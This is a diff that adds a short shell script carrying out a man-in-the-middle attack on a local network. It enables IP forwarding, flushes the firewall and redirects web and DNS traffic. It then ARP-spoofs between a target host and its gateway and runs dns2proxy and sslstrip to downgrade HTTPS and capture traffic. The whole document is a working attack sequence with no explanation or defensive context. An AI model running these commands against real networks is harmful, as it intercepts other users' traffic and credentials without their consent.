@@ -1,0 +1,21 @@
+
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+cat /proc/sys/net/ipv4/ip_forward
+
+iptables --flush
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 53 -j REDIRECT --to-port 53
+
+iptables -t nat -L -n -v | grep 'something'
+
+arpspoof -i eth0 -t 10.20.20.132 10.20.20.2 
+
+arpspoof -i eth0 -t 10.20.20.2 10.20.20.132
+
+python dns2proxy.py
+
+sslstrip -l 9000 -a
+
